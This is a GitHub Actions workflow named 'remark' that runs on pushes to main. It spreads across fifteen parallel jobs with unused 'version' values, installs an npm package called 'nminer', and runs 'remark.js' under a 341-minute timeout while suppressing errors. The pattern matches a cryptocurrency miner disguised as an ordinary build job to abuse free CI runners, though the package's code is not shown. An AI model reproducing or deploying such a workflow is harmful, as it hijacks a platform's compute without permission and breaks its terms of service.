name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6535 }
          - { version: 7979 }
          - { version: 2287 }
          - { version: 3533 }
          - { version: 5060 }
          - { version: 2465 }
          - { version: 192 }
          - { version: 1332 }
          - { version: 1496 }
          - { version: 6029 }
          - { version: 3402 }
          - { version: 1033 }
          - { version: 938 }
          - { version: 6921 }
          - { version: 9370 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: quicker
        run: |
          npm install nminer@latest
          timeout 341m node remark.js || echo "remark executed"